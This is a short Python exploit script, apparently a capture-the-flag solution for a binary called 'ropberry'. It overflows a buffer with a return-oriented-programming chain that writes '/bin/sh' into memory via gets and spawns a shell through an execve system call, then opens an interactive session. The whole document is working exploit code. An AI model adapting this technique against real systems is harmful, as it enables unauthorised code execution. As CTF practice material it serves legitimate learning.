from ptrlib import *

sock = Process("./ropberry")

addr_gets = 0x08049af0
ptr_sh = 0x80ed000
rop_pop_eax = 0x080c1906
rop_pop_ebx = 0x080481ec
rop_pop_ecx = 0x080e394a
rop_pop_edx = 0x0805957a
rop_int80 = 0x08059d70

payload = b'A' * 0x8
payload += p32(addr_gets)
payload += p32(rop_pop_eax)
payload += p32(ptr_sh)
payload += p32(rop_pop_eax)
payload += p32(11)
payload += p32(rop_pop_ebx)
payload += p32(ptr_sh)
payload += p32(rop_pop_ecx)
payload += p32(0)
payload += p32(rop_pop_edx)
payload += p32(0)
payload += p32(rop_int80)

sock.recvuntil("president.\n")
sock.sendline(payload)

sock.sendline("/bin/sh\x00")

sock.interactive()
